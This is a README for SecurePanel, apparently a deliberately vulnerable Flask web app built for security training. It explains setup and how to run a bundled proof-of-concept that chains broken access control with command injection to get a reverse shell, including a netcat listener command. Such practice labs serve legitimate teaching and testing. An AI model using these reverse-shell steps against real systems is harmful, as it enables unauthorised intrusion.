# SecurePanel
Vulnerable webapp via Flask. For testing purposes. (Works on unix-based and windows hosts)

1. Download the entire repository:

    git clone https://github.com/V01DsTh3/SecurePanel.git


2. Start the webapp

    cd SecurePanel/webapp && python3 app.py

From here you can either start manually exploiting the vulnerabilities or run the provided poc script:

SecurePanel POC:
    # From the attacker host:
    cd webapp_poc
    python3 securepanel_poc.py -h
    # For BAC vulnerability only:
    python3 securepanel_poc.py -t <target_ip> -P <target_port> -u <username> -p <password> 
    # For BAC and command injection for reverse shell:
    # On a different terminal start a listener:
    nc -lvnp <PORT>
    python3 securepanel_poc.py -t <target_ip> -P <target_port> -u <username> -p <password> -r -a <listener_ip> -v <listener_port>
